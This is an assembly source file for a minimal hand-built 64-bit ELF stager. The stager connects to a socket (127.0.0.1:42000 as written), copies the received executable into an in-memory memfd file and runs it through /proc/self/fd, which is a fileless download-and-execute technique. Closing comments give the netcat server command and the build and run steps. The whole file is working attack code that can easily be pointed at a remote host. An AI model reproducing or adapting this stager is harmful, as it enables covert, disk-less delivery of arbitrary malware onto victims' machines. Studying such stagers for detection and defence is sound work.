;-- download file from 127.0.0.1:42000 to ram and execute -------------------------//--
BITS 64
  org 0x100000000
;---------------------+------+-------------+------------------------------------------+
; Code Listing        | OFFS |  ASSEMBLY   | CODE COMMENT                             |
;---------------------+------+-------------+------------------------------------------+
  db 0x7F, "ELF"      ; 0x0  |    7f454c46 | Elf Magic Value
_start:               ;      |             |-- Begin socket syscall 
  push byte 0x29      ; 0x04 |        6a29 | Syscall 41 - socket 
  pop rax             ; 0x06 |          58 | Putting it into RAX 
  push byte 0x2       ; 0x07 |        6a02 | AF_INET
  pop rdi             ; 0x09 |          5f | Into RDI 
  push byte 0x1       ; 0x0A |        6a01 | SOCK_STREAM
  pop rsi             ; 0x0C |          5e | Into RSI 
  cdq                 ; 0x0D |          99 | RDX = 0, CDQ sign extends AX/EAX and stores in DX/EDX.
  jmp short conec     ; 0x0E |       eb 3c | Then onto the rest of our code 
  dw 2                ; 0x10 |       02 00 | e_type              
  dw 0x3e             ; 0x12 |       3e 00 | e_machine           
  dd 1                ; 0x14 | 01 00 00 00 | e_version           
  dd _start - $$      ; 0x18 | 04 00 00 00 | e_entry             
phdr:                 ;      |             |-- Begin Program Header
  dd 1                ; 0x1C | 01 00 00 00 |                    [PHDR] p_type
  dd phdr - $$        ; 0x20 | 1C 00 00 00 | [EHDR] e_phoff     [PHDR] p_flags  
  dd 0                ; 0x24 | 00 00 00 00 |                    [PHDR] p_offset
  dd 0                ; 0x28 | 00 00 00 00 | [EHDR] e_shoff     
  dq $$               ; 0x2C | 00 00 00 00 |                    [PHDR] p_vaddr
                      ; 0x30 | 01 00 00 00 | [EHDR] e_flags
  dw 0x40             ; 0x34 |       40 00 | [EHDR] e_ehsize    [PHDR] p_addr 
  dw 0x38             ; 0x36 |       38 00 | [EHDR] e_phentsize 
  dw 1                ; 0x38 |       01 00 | [EHDR] e_phnum
  dw 2                ; 0x3A |       02 00 | [EHDR] e_shentsize 
exito:                ;      |             |-- Exit syscall
  add al, 0x3C        ; 0x3C |        043c | left here for space purposes!!
  syscall             ; 0x3E |        0f05 | Call kernel
  dd 0                ; 0x40 |             | [PHDR] p_filesz
  add al, 0x3C        ; 0x44 |        043c | execve syscall
  syscall             ; 0x46 |        0f05 | Call kernel
  dd 0                ; 0x48 | 00 00 00 00 | [PHDR] p_memsz
conec:
  syscall
; connect ----------------------------------------------------------------------
; We connect to our host to grab the file buffer
; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
;  arg0: rdi = int sockfd
;  arg1: rsi = const struct sockaddr *addr
;  arg2: rdx = socklen_t addrlen
  xchg rdi, rax ; Save sockfd
  mov rbx, rdi  ; Save sockfd in rbx too for later
  mov dword [rsp-4], 0x100007f ; Our IP   = 127.0.0.1
  mov word  [rsp-6], 0x10a4    ; Our Port = 42000
  mov byte  [rsp-8], 0x02      ; sockfd
  sub rsp, 8                   ; sub sp makes no difference
  push byte 0x2a               ; Push connect syscall number
  pop rax                      ; move into rax
  mov rsi, rsp                 ; pointer to socket struct
  push byte 0x10               ; length
  pop rdx                      ; length -> rdx
  syscall                      ; Execute the connect syscall
; memfd -------------------------------------------------------------------------
; We are creating a virtual file to save our socket buffer to.
; sys_open(filename,O)
;  arg0: rdi = const char *pathname
;  arg1: rsi = int flags
  mov ax, 0x13f   ; The syscall
  push 0x474e4142 ; Filename BANG (GNAB here)
  mov rdi, rsp    ; Arg0: The file name
  xor rsi, rsi    ; Testing this instead for flags
  syscall
  mov r9, rax     ; Save the local file descriptor
  mov rdx, 0x03e8 ; The size of our memory chunk
rwloop:
; read -------------------------------------------------------------------------
; We are reading the socket buffer to a buffer to save to local file
; sys_read(socket sockfd,buf,len)  number 0
;  arg0: rdi = unsigned int fd  
;  arg1: rsi = char __user *buf 
;  arg2: rdx = size_t count     
  mov rdi, rbx        ; Move sockFD to RDI
  xor rax, rax        ; 0 is read sycall
  lea rsi, [rsp-1000] ; buffer to hold output - arg1 *buf
  syscall
; write ------------------------------------------------------------------------
; We are writing the socket buffer to our local file
; sys_write(fd,*buf,count)
;  arg0: rdi = unsigned int fd  
;  arg1: rsi = char __user *buf 
;  arg2: rdx = size_t count     
  mov rdi, r9    ; Copy the file descriptor from our local file
  mov rdx, rax   ; RAX has the number of bytes read, 0 means end of file
  xor rax, rax
  mov al, 1
  syscall
  cmp dx, 0x03e8 ; Checks if there are still bytes to read
  je rwloop
; execve -----------------------------------------------------------------------
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;  arg0: rdi = const char *pathname
;  arg1: rsi = char *const argv[]
;  arg2: rdx = char *const envp[] 
  xor rax, rax        ; make 0
  mov rbx, 0x00342f64662f666c ; 4/df/fl
  push rbx            
  mov rbx, 0x65732f636f72702f ; es/corp/
  push rbx            ; We've pushed /proc/self/fd/4 onto the stack
  mov rdi, rsp        ; move pointer to the string to rdi
  push rax            ; push a 0 
  mov rdx, rsp        ; push pointer to 0 to rdx
  push rdi            ; push file string to stack
  mov rsi, rsp        ; move pointer to it to rsi
  add al, 0x3b
  syscall     
;--- Usage
; Setup server
;  $ cat some_executable | nc -k -nlvp 42000
; Build
;  $ nasm -f bin dl_memfd_219.asm -o dl_memfd_219; chmod +x dl_memfd_219
; Exec
;  $ ./dl_memfd_219
